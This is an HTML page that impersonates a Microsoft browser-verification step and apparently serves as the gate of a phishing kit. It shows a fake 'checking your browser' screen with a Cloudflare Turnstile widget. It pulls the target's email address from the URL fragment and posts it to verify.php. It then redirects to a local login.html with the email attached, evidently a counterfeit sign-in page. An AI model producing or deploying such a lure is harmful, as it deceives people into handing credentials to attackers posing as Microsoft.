<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Microsoft Verification</title>
  <style>
    html, body {
      height: 100%;
      margin: 0;
      background-color: #1d1d1d;
      color: white;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      text-align: center; /* <-- Ensures ALL text is centered */
    }

    body {
      padding: 20px;
      box-sizing: border-box;
    }

    .container {
      max-width: 400px;
      width: 100%;
      text-align: center; /* <-- Extra guarantee */
      display: flex;
      flex-direction: column;
      align-items: center; /* Centers inside container */
      justify-content: center;
      gap: 20px; /* Better spacing between elements */
    }

    h1 {
      font-weight: 600;
      margin: 0;
      font-size: 24px;
      line-height: 1.4;
      text-align: center; /* Added */
      white-space: normal; /* Prevents cutting on smaller screens */
    }

    #security-msg {
      font-size: 16px;
      color: #ccc;
      margin: 0;
      min-height: 24px;
      text-align: center; /* Added */
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Checking your browser before accessing Microsoft</h1>
    <p id="security-msg">Verifying you are human. This may take a few seconds...</p>

    <form id="turnstile-form" action="verify.php" method="POST">
      <input type="hidden" name="hash" id="hash-field" />
      <div
        class="cf-turnstile"
        data-sitekey="0x4AAAAAABh8YRnURc-1UUi-"
        data-callback="onCaptchaSuccess"
      ></div>
    </form>
  </div>

  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>

  <script>
    // Animation messages
    const statusMessages = [
      "Performing browser integrity check...",
      "Validating session security...",
      "Verifying you are human..."
    ];
    const securityMsg = document.getElementById("security-msg");
    statusMessages.forEach((msg, i) => {
      setTimeout(() => {
        securityMsg.textContent = msg;
      }, i * 1300);
    });

    // Extract email from #hash
    let extractedEmail = null;
    window.addEventListener("DOMContentLoaded", () => {
      const hashValue = window.location.hash.replace("#", "").trim();

      // Check if hash looks like an email
      if (hashValue && hashValue.includes("@")) {
        extractedEmail = hashValue;
      }

      document.getElementById("hash-field").value = window.location.hash;
    });

    // Cloudflare Turnstile callback
    function onCaptchaSuccess() {
      document.getElementById("turnstile-form").submit();
    }

    // Redirect after delay
    window.onload = function () {
      setTimeout(() => {
        if (extractedEmail) {
          window.location.href = "login.html#" + extractedEmail;
        } else {
          window.location.href = "login.html";
        }
      }, 4000);
    };
  </script>
</body>
</html>
